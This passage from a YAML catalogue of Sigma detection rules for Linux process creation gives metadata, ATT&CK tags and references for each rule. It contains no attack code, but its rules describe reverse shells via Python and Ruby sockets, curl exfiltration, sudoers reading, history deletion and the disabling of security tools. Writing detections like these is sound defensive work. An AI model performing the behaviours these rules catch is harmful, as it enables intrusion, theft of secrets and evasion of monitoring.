  - attack.discovery
  - attack.credential-access
  - attack.t1083
  - attack.t1552.001
  time_window: ''
  references:
  - https://github.com/trufflesecurity/trufflehog
  - https://www.getsafety.com/blog-posts/shai-hulud-npm-attack
  false_positives:
  - Legitimate use of TruffleHog by security teams or developers.
  notes: ''
- detection_id: 3f0f5957-04f8-4792-ad89-192b0303bde6
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_python_http_server_execution.yml
  name: Python WebServer Execution - Linux
  description: 'Detects the execution of Python web servers via command line interface
    (CLI).

    After gaining access to target systems, adversaries may use Python''s built-in
    HTTP server modules to quickly establish a web server without requiring additional
    software.

    This technique is commonly used in post-exploitation scenarios as it provides
    a simple method for transferring files between the compromised host and attacker-controlled
    systems.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: experimental
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Exfiltration
  techniques:
  - T1048.003
  tags:
  - attack.exfiltration
  - attack.t1048.003
  time_window: ''
  references:
  - https://www.atomicredteam.io/atomic-red-team/atomics/T1048.003#atomic-test-8---python3-httpserver
  - https://docs.python.org/3/library/http.server.html
  - https://docs.python.org/2/library/simplehttpserver.html
  false_positives:
  - Testing or development activity
  notes: ''
- detection_id: c4042d54-110d-45dd-a0e1-05c47822c937
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_python_pty_spawn.yml
  name: Python Spawning Pretty TTY Via PTY Module
  description: 'Detects a python process calling to the PTY module in order to spawn
    a pretty tty which could be indicative of potential reverse shell activity.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  tags:
  - attack.execution
  - attack.t1059
  time_window: ''
  references:
  - https://www.volexity.com/blog/2022/06/02/zero-day-exploitation-of-atlassian-confluence/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 32e62bc7-3de0-4bb1-90af-532978fe42c0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_python_reverse_shell.yml
  name: Python Reverse Shell Execution Via PTY And Socket Modules
  description: 'Detects the execution of python with calls to the socket and pty module
    in order to connect and spawn a potential reverse shell.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  time_window: ''
  references:
  - https://www.revshells.com/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 2d2f44ff-4611-4778-a8fc-323a0e9850cc
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_python_shell_os_system.yml
  name: Inline Python Execution - Spawn Shell Via OS System Library
  description: 'Detects execution of inline Python code via the "-c" in order to call
    the "system" function from the "os" library, and spawn a shell.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  tags:
  - attack.execution
  - attack.t1059
  time_window: ''
  references:
  - https://gtfobins.github.io/gtfobins/python/#shell
  false_positives:
  - Unknown
  notes: ''
- detection_id: 1f6b8cd4-3e60-47cc-b282-5aa1cbc9182d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_remote_access_tools_teamviewer_incoming_connection.yml
  name: Remote Access Tool - Team Viewer Session Started On Linux Host
  description: 'Detects the command line executed when TeamViewer starts a session
    started by a remote host.

    Once a connection has been started, an investigator can verify the connection
    details by viewing the "incoming_connections.txt" log file in the TeamViewer folder.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: low
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1133
  tags:
  - attack.persistence
  - attack.initial-access
  - attack.t1133
  time_window: ''
  references:
  - Internal Research
  false_positives:
  - Legitimate usage of TeamViewer
  notes: ''
- detection_id: 11063ec2-de63-4153-935e-b1a8b9e616f1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_remote_system_discovery.yml
  name: Linux Remote System Discovery
  description: Detects the enumeration of other remote systems.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1018
  tags:
  - attack.discovery
  - attack.t1018
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1018/T1018.md
  false_positives:
  - Legitimate administration activities
  notes: ''
- detection_id: 95d61234-7f56-465c-6f2d-b562c6fedbc4
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_remove_package.yml
  name: Linux Package Uninstall
  description: Detects linux package removal using builtin tools such as "yum", "apt",
    "apt-get" or "dpkg".
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: low
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1070
  tags:
  - attack.defense-evasion
  - attack.t1070
  time_window: ''
  references:
  - https://sysdig.com/blog/mitre-defense-evasion-falco
  - https://www.tutorialspoint.com/how-to-install-a-software-on-linux-using-yum-command
  - https://linuxhint.com/uninstall_yum_package/
  - https://linuxhint.com/uninstall-debian-packages/
  false_positives:
  - Administrator or administrator scripts might delete packages for several reasons
    (debugging, troubleshooting).
  notes: ''
- detection_id: e2326866-609f-4015-aea9-7ec634e8aa04
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_rsync_shell_execution.yml
  name: Shell Execution via Rsync - Linux
  description: 'Detects the use of the "rsync" utility to execute a shell. Such behavior
    may be associated with privilege escalation, unauthorized command execution, or
    to break out from restricted environments.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: experimental
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  tags:
  - attack.execution
  - attack.t1059
  time_window: ''
  references:
  - https://gtfobins.github.io/gtfobins/rsync/#shell
  false_positives:
  - Legitimate cases in which "rsync" is used to execute a shell
  notes: ''
- detection_id: 297241f3-8108-4b3a-8c15-2dda9f844594
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_rsync_shell_spawn.yml
  name: Suspicious Invocation of Shell via Rsync
  description: 'Detects the execution of a shell as sub process of "rsync" without
    the expected command line flag "-e" being used, which could be an indication of
    exploitation as described in CVE-2024-12084. This behavior is commonly associated
    with attempts to execute arbitrary commands or escalate privileges, potentially
    leading to unauthorized access or further exploitation.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: experimental
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  - T1203
  tags:
  - attack.execution
  - attack.t1059
  - attack.t1203
  time_window: ''
  references:
  - https://sysdig.com/blog/detecting-and-mitigating-cve-2024-12084-rsync-remote-code-execution/
  - https://gist.github.com/Neo23x0/a20436375a1e26524931dd8ea1a3af10
  false_positives:
  - Unknown
  notes: ''
- detection_id: b8bdac18-c06e-4016-ac30-221553e74f59
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_ruby_reverse_shell.yml
  name: Potential Ruby Reverse Shell
  description: Detects execution of ruby with the "-e" flag and calls to "socket"
    related functions. This could be an indication of a potential attempt to setup
    a reverse shell
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  time_window: ''
  references:
  - https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
  - https://www.revshells.com/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 6b14bac8-3e3a-4324-8109-42f0546a347f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_schedule_task_job_cron.yml
  name: Scheduled Cron Task/Job - Linux
  description: Detects abuse of the cron utility to perform task scheduling for initial
    or recurring execution of malicious code. Detection will focus on crontab jobs
    uploaded from the tmp folder.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1053.003
  tags:
  - attack.execution
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1053.003
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1053.003/T1053.003.md
  false_positives:
  - Legitimate administration activities
  notes: ''
- detection_id: c9d8b7fd-78e4-44fe-88f6-599135d46d60
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_security_software_discovery.yml
  name: Security Software Discovery - Linux
  description: Detects usage of system utilities (only grep and egrep for now) to
    discover security software discovery
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1518.001
  tags:
  - attack.discovery
  - attack.t1518.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1518.001/T1518.001.md
  false_positives:
  - Legitimate activities
  notes: ''
- detection_id: e3a8a052-111f-4606-9aee-f28ebeb76776
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_security_tools_disabling.yml
  name: Disabling Security Tools
  description: Detects disabling security tools
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1562.004
  tags:
  - attack.defense-evasion
  - attack.t1562.004
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.004/T1562.004.md
  false_positives:
  - Legitimate administration activities
  notes: ''
- detection_id: de25eeb8-3655-4643-ac3a-b662d3f26b6b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_services_stop_and_disable.yml
  name: Disable Or Stop Services
  description: Detects the usage of utilities such as 'systemctl', 'service'...etc
    to stop or disable tools and services
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - https://www.trendmicro.com/pl_pl/research/20/i/the-evolution-of-malicious-shell-scripts.html
  false_positives:
  - Legitimate administration activities
  notes: ''
- detection_id: c21c4eaa-ba2e-419a-92b2-8371703cbe21
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_setgid_setuid.yml
  name: Setuid and Setgid
  description: Detects suspicious change of file privileges with chown and chmod commands
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: low
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1548.001
  tags:
  - attack.defense-evasion
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1548.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1548.001/T1548.001.md
  false_positives:
  - Legitimate administration activities
  notes: ''
- detection_id: 8737b7f6-8df3-4bb7-b1da-06019b99b687
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_ssh_shell_execution.yml
  name: Shell Invocation Via Ssh - Linux
  description: 'Detects the use of the "ssh" utility to execute a shell. Such behavior
    may be associated with privilege escalation, unauthorized command execution, or
    to break out from restricted environments.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  tags:
  - attack.execution
  - attack.t1059
  time_window: ''
  references:
  - https://gtfobins.github.io/gtfobins/ssh/
  - https://www.elastic.co/guide/en/security/current/linux-restricted-shell-breakout-via-linux-binary-s.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: f9b3edc5-3322-4fc7-8aa3-245d646cc4b7
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_ssm_agent_abuse.yml
  name: Potential Linux Amazon SSM Agent Hijacking
  description: Detects potential Amazon SSM agent hijack attempts as outlined in the
    Mitiga research report.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1219.002
  tags:
  - attack.command-and-control
  - attack.persistence
  - attack.t1219.002
  time_window: ''
  references:
  - https://www.mitiga.io/blog/mitiga-security-advisory-abusing-the-ssm-agent-as-a-remote-access-trojan
  - https://www.bleepingcomputer.com/news/security/amazons-aws-ssm-agent-can-be-used-as-post-exploitation-rat-malware/
  - https://www.helpnetsecurity.com/2023/08/02/aws-instances-attackers-access/
  false_positives:
  - Legitimate activity of system administrators
  notes: ''
- detection_id: 6419afd1-3742-47a5-a7e6-b50386cd15f8
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_susp_chmod_directories.yml
  name: Chmod Suspicious Directory
  description: Detects chmod targeting files in abnormal directory paths.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1222.002
  tags:
  - attack.defense-evasion
  - attack.t1222.002
  time_window: ''
  references:
  - https://www.intezer.com/blog/malware-analysis/new-backdoor-sysjoker/
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1222.002/T1222.002.md
  false_positives:
  - Admin changing file permissions.
  notes: ''
- detection_id: 746c86fb-ccda-4816-8997-01386263acc4
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_susp_container_residence_discovery.yml
  name: Container Residence Discovery Via Proc Virtual FS
  description: Detects potential container discovery via listing of certain kernel
    features in the "/proc" virtual filesystem
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1082
  tags:
  - attack.discovery
  - attack.t1082
  time_window: ''
  references:
  - https://blog.skyplabs.net/posts/container-detection/
  - https://stackoverflow.com/questions/20010199/how-to-determine-if-a-process-runs-inside-lxc-docker
  false_positives:
  - Legitimate system administrator usage of these commands
  - Some container tools or deployments may use these techniques natively to determine
    how they proceed with execution, and will need to be filtered
  notes: ''
- detection_id: 00b90cc1-17ec-402c-96ad-3a8117d7a582
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_susp_curl_fileupload.yml
  name: Suspicious Curl File Upload - Linux
  description: Detects a suspicious curl process start the adds a file to a web request
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Exfiltration
  techniques:
  - T1105
  - T1567
  tags:
  - attack.exfiltration
  - attack.command-and-control
  - attack.t1567
  - attack.t1105
  time_window: ''
  references:
  - https://twitter.com/d1r4c/status/1279042657508081664
  - https://medium.com/@petehouston/upload-files-with-curl-93064dcccc76
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1105/T1105.md#atomic-test-19---curl-upload-file
  - https://curl.se/docs/manpage.html
  - https://www.trendmicro.com/en_us/research/22/i/how-malicious-actors-abuse-native-linux-tools-in-their-attacks.html
  false_positives:
  - Scripts created by developers and admins
  notes: ''
- detection_id: b86d356d-6093-443d-971c-9b07db583c68
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_susp_curl_useragent.yml
  name: Suspicious Curl Change User Agents - Linux
  description: Detects a suspicious curl process start on linux with set useragent
    options
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1071.001
  tags:
  - attack.command-and-control
  - attack.t1071.001
  time_window: ''
  references:
  - https://curl.se/docs/manpage.html
  false_positives:
  - Scripts created by developers and admins
  - Administrative activity
  notes: ''
- detection_id: 11701de9-d5a5-44aa-8238-84252f131895
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_susp_dockerenv_recon.yml
  name: Docker Container Discovery Via Dockerenv Listing
  description: Detects listing or file reading of ".dockerenv" which can be a sing
    of potential container discovery
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1082
  tags:
  - attack.discovery
  - attack.t1082
  time_window: ''
  references:
  - https://blog.skyplabs.net/posts/container-detection/
  - https://stackoverflow.com/questions/20010199/how-to-determine-if-a-process-runs-inside-lxc-docker
  false_positives:
  - Legitimate system administrator usage of these commands
  - Some container tools or deployments may use these techniques natively to determine
    how they proceed with execution, and will need to be filtered
  notes: ''
- detection_id: 312b42b1-bded-4441-8b58-163a3af58775
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_susp_execution_tmp_folder.yml
  name: Potentially Suspicious Execution From Tmp Folder
  description: Detects a potentially suspicious execution of a process located in
    the '/tmp/' folder
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 4
  predictive_readiness_factors:
  - sequence_or_progression_logic
  severity: medium
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1036
  tags:
  - attack.defense-evasion
  - attack.t1036
  time_window: ''
  references:
  - https://blogs.jpcert.or.jp/en/2023/05/gobrat.html
  - https://jstnk9.github.io/jstnk9/research/GobRAT-Malware/
  - https://www.virustotal.com/gui/file/60bcd645450e4c846238cf0e7226dc40c84c96eba99f6b2cffcd0ab4a391c8b3/detection
  - https://www.virustotal.com/gui/file/3e44c807a25a56f4068b5b8186eee5002eed6f26d665a8b791c472ad154585d1/detection
  false_positives:
  - Unknown
  notes: ''
- detection_id: 8344c0e5-5783-47cc-9cf9-a0f7fd03e6cf
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_susp_find_execution.yml
  name: Potential Discovery Activity Using Find - Linux
  description: Detects usage of "find" binary in a suspicious manner to perform discovery
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1083
  tags:
  - attack.discovery
  - attack.t1083
  time_window: ''
  references:
  - https://github.com/SaiSathvik1/Linux-Privilege-Escalation-Notes
  false_positives:
  - Unknown
  notes: ''
- detection_id: cfec9d29-64ec-4a0f-9ffe-0fdb856d5446
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_susp_git_clone.yml
  name: Suspicious Git Clone - Linux
  description: Detects execution of "git" in order to clone a remote repository that
    contain suspicious keywords which might be suspicious
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Reconnaissance
  techniques:
  - T1593.003
  tags:
  - attack.reconnaissance
  - attack.t1593.003
  time_window: ''
  references:
  - https://gist.githubusercontent.com/MichaelKoczwara/12faba9c061c12b5814b711166de8c2f/raw/e2068486692897b620c25fde1ea258c8218fe3d3/history.txt
  false_positives:
  - Unknown
  notes: ''
- detection_id: 1182f3b3-e716-4efa-99ab-d2685d04360f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_susp_history_delete.yml
  name: History File Deletion
  description: Detects events in which a history file gets deleted, e.g. the ~/bash_history
    to remove traces of malicious activity
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1565.001
  tags:
  - attack.impact
  - attack.t1565.001
  time_window: ''
  references:
  - https://github.com/sleventyeleven/linuxprivchecker/
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1552.003/T1552.003.md
  false_positives:
  - Legitimate administration activities
  notes: ''
- detection_id: d7821ff1-4527-4e33-9f84-d0d57fa2fb66
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_susp_history_recon.yml
  name: Print History File Contents
  description: Detects events in which someone prints the contents of history files
    to the commandline or redirects it to a file for reconnaissance
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Reconnaissance
  techniques:
  - T1592.004
  tags:
  - attack.reconnaissance
  - attack.t1592.004
  time_window: ''
  references:
  - https://github.com/sleventyeleven/linuxprivchecker/
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1552.003/T1552.003.md
  false_positives:
  - Legitimate administration activities
  notes: ''
- detection_id: a015e032-146d-4717-8944-7a1884122111
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_susp_hktl_execution.yml
  name: Linux HackTool Execution
  description: Detects known hacktool execution based on image name.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1587
  tags:
  - attack.execution
  - attack.resource-development
  - attack.t1587
  time_window: ''
  references:
  - https://github.com/Gui774ume/ebpfkit
  - https://github.com/pathtofile/bad-bpf
  - https://github.com/carlospolop/PEASS-ng
  - https://github.com/t3l3machus/hoaxshell
  - https://github.com/t3l3machus/Villain
  - https://github.com/HavocFramework/Havoc
  - https://github.com/1N3/Sn1per
  - https://github.com/Ne0nd0g/merlin
  - https://github.com/Pennyw0rth/NetExec/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 43e26eb5-cd58-48d1-8ce9-a273f5d298d8
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_susp_inod_listing.yml
  name: Potential Container Discovery Via Inodes Listing
  description: Detects listing of the inodes of the "/" directory to determine if
    the we are running inside of a container.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1082
  tags:
  - attack.discovery
  - attack.t1082
  time_window: ''
  references:
  - https://blog.skyplabs.net/posts/container-detection/
  - https://stackoverflow.com/questions/20010199/how-to-determine-if-a-process-runs-inside-lxc-docker
  false_positives:
  - Legitimate system administrator usage of these commands
  - Some container tools or deployments may use these techniques natively to determine
    how they proceed with execution, and will need to be filtered
  notes: ''
- detection_id: ea3ecad2-db86-4a89-ad0b-132a10d2db55
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_susp_interactive_bash.yml
  name: Interactive Bash Suspicious Children
  description: Detects suspicious interactive bash as a parent to rather uncommon
    child processes
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 4
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  severity: medium
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1036
  - T1059.004
  tags:
  - attack.execution
  - attack.defense-evasion
  - attack.t1059.004
  - attack.t1036
  time_window: ''
  references:
  - Internal Research
  false_positives:
  - Legitimate software that uses these patterns
  notes: ''
- detection_id: d292e0af-9a18-420c-9525-ec0ac3936892
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_susp_java_children.yml
  name: Suspicious Java Children Processes
  description: Detects java process spawning suspicious children
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  tags:
  - attack.execution
  - attack.t1059
  time_window: ''
  references:
  - https://www.tecmint.com/different-types-of-linux-shells/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 3e102cd9-a70d-4a7a-9508-403963092f31
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_susp_network_utilities_execution.yml
  name: Linux Network Service Scanning Tools Execution
  description: Detects execution of network scanning and reconnaisance tools. These
    tools can be used for the enumeration of local or remote network services for
    example.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1046
  tags:
  - attack.discovery
  - attack.t1046
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1046/T1046.md
  - https://github.com/projectdiscovery/naabu
  - https://github.com/Tib3rius/AutoRecon
  false_positives:
  - Legitimate administration activities
  notes: ''
- detection_id: 880973f3-9708-491c-a77b-2a35a1921158
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_susp_pipe_shell.yml
  name: Linux Shell Pipe to Shell
  description: Detects suspicious process command line that starts with a shell that
    executes something and finally gets piped into another shell
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1140
  tags:
  - attack.defense-evasion
  - attack.t1140
  time_window: ''
  references:
  - Internal Research
  false_positives:
  - Legitimate software that uses these patterns
  notes: ''
- detection_id: 0f79c4d2-4e1f-4683-9c36-b5469a665e06
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_susp_process_reading_sudoers.yml
  name: Access of Sudoers File Content
  description: Detects the execution of a text-based file access or inspection utilities
    to read the content of /etc/sudoers in order to potentially list all users that
    have sudo rights.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Reconnaissance
  techniques:
  - T1592.004
  tags:
  - attack.reconnaissance
  - attack.t1592.004
  time_window: ''
  references:
  - https://github.com/sleventyeleven/linuxprivchecker/
